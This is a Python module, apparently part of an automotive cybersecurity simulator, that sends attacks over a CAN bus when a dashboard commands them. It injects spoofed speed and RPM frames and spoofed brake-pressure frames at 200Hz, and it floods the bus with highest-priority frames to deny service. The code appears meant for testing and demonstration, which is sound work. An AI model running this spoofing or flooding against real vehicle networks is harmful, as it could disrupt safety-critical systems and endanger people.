import can
import time
import threading
import random

class AttackSimulator:
    def __init__(self, can_bus, ethernet_bus):
        self.can_bus = can_bus
        self.ethernet_bus = ethernet_bus
        self.running = True
        
        # State
        self.active_attack = None
        self.flood_thread = None
        
    def start(self):
        print("[ATTACK SIMULATOR] Starting Cybersecurity Module...")
        t = threading.Thread(target=self._command_listener, daemon=True)
        t.start()
        
    def stop(self):
        self.running = False
        self.active_attack = None
        print("[ATTACK SIMULATOR] Stopped.")
        
    def _command_listener(self):
        """Listen to ethernet_bus for attack commands from the dashboard"""
        # Clear any stale commands on simulator start
        self.ethernet_bus['attack_command'] = None
        self.ethernet_bus['active_attack'] = None
        
        while self.running:
            cmd = self.ethernet_bus.get('attack_command')
            if cmd:
                # Deduplicate and log
                if cmd == self.active_attack and cmd != 'STOP_ALL':
                    self.ethernet_bus['attack_command'] = None
                    continue
                    
                print(f"[ATTACK SIMULATOR] Received Dashboard Command: {cmd}")
                
                if cmd == 'STOP_ALL':
                    self.active_attack = None
                    self.ethernet_bus['active_attack'] = None
                    print("[ATTACK SIMULATOR] All attacks halted.")
                else:
                    self.active_attack = cmd
                    self.ethernet_bus['active_attack'] = cmd
                    if cmd == 'SPOOF_SPEED':
                        threading.Thread(target=self._spoof_speed, daemon=True, name="SpoofSpeed").start()
                    elif cmd == 'SPOOF_BRAKE':
                        threading.Thread(target=self._spoof_brake, daemon=True, name="SpoofBrake").start()
                    elif cmd == 'DOS_FLOOD':
                        self._start_flood()
                
                # Clear command after processing
                self.ethernet_bus['attack_command'] = None
                
            time.sleep(0.1)
            
    def _spoof_speed(self):
        """Send spoofed speed messages continuously until stopped"""
        print("[CRIT] [ATTACK SIMULATOR] Starting Continuous Speed Spoofing Attack...")
        from utils.can_codec import codec
        
        while self.active_attack == 'SPOOF_SPEED' and self.running:
            # We flood the bus at 200Hz to ensure our spoofed message overrides the real ECU
            msg = can.Message(
                arbitration_id=0x100,
                data=codec.encode(0x100, {
                    'Engine_RPM': 7800,
                    'Vehicle_Speed': 245,
                    'Drive_Phase': 4 # HIGHWAY
                }),
                is_extended_id=False
            )
            try:
                self.can_bus.send(msg)
            except:
                pass
            time.sleep(0.005) # 200Hz
        
        print("[ATTACK SIMULATOR] Speed spoofing attack stopped.")
        
    def _spoof_brake(self):
        """Send spoofed brake messages continuously until stopped"""
        print("[CRIT] [ATTACK SIMULATOR] Starting Continuous Brake Spoofing Attack...")
        from utils.can_codec import codec
        
        while self.active_attack == 'SPOOF_BRAKE' and self.running:
            # Flood at 200Hz
            msg = can.Message(
                arbitration_id=0x201,
                data=codec.encode(0x201, {
                    'Brake_Pressure': 145
                }),
                is_extended_id=False
            )
            try:
                self.can_bus.send(msg)
            except:
                pass
            time.sleep(0.005) # 200Hz
            
        print("[ATTACK SIMULATOR] Brake spoofing attack stopped.")
        
    def _start_flood(self):
        """Start a thread to flood the bus with highest priority messages (0x000)"""
        print("[CRIT] [ATTACK SIMULATOR] Starting DoS Flood Attack...")
        if self.flood_thread and self.flood_thread.is_alive():
            return
            
        def flood():
            msg = can.Message(
                arbitration_id=0x000, # Highest priority
                data=[0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x00, 0x00, 0x00],
                is_extended_id=False
            )
            while self.active_attack == 'DOS_FLOOD' and self.running:
                try:
                    self.can_bus.send(msg)
                except Exception:
                    pass
                # No sleep! Absolute flood.
                
        self.flood_thread = threading.Thread(target=flood, daemon=True)
        self.flood_thread.start()
